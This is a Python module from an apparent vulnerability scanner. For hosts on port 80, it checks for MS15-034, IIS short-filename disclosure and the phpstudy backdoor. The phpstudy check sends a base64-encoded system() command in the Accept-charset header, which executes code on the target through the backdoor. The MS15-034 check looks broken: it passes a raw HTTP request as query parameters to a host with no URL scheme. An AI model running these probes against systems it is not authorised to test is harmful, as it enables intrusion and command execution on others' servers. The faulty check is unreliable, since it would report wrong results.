# -*- encoding: utf-8 -*-
'''
@Author : aydcyhr
@Contact : aydcyhr@gmail.com
'''

import nmap
from lib import *
import requests

def p80(portdic):
	p80list = []
	for ip in portdic:
		ip = ip.split(":")
		if ip[-1] == "80":
			p80list.append(ms15_034(ip[0]))
			p80list.append(phpstudy(ip[0]))
			p80list.append(iisshort(ip[0]))
	res = list(filter(None, p80list))
	return res

def ms15_034(host_list):
	try:
		req = requests.get(str(host_list))
		vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
		requests.packages.urllib3.disable_warnings()
		req = requests.get(str(host_list), params=vuln_buffer,verify=False)
		if req.status_code == 416 :
			print(str(host_list)+'\t存在http.sys远程代码执行漏洞(MS15-034)')
			a = host_list + ":80:存在http.sys远程代码执行漏洞(MS15-034)"
			return a
		else:
			pass   
	except:
		pass

def iisshort(host_list):
	try:
		host_list1 = host_list+"/*~1*/.aspx"
		host_list2 = host_list+"/asdfasfasdf*~1*/.aspx"
		requests.packages.urllib3.disable_warnings()
		a = requests.get("http://" + host_list1,timeout=5,verify=False)
		b = requests.get("http://" + host_list2,timeout=5,verify=False)
		if a.status_code == 404 and b.status_code != 404:
			print(str(host_list)+'\t存在IIS短文件名漏洞')
			c = host_list+":80:存在IIS短文件名漏洞"
			return c
	except:
		pass

def phpstudy(host_list):
	header ={ "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Language": "zh-CN",
				"Accept-Encoding": "gzip,deflate",
				"X-Forwarded-For": "8.8.8.8",
				"Connection": "close",
				"Accept-charset": "c3lzdGVtKCdlY2hvIEpFMlNlSnVzdFRydXN0bWUnKSA7",
				"Upgrade-Insecure-Requests": "1"}
	try:
		requests.packages.urllib3.disable_warnings()			
		a = requests.get("http://" + host_list,headers=header,timeout=5,verify=False)
		if "JE2SeJustTrustme" in a.text:
			print(str(host_list)+'\t存在phpstudy后门')
			ff = host_list + ":80:存在phpstudy后门"
			return ff
		else:
			pass
	except:
		pass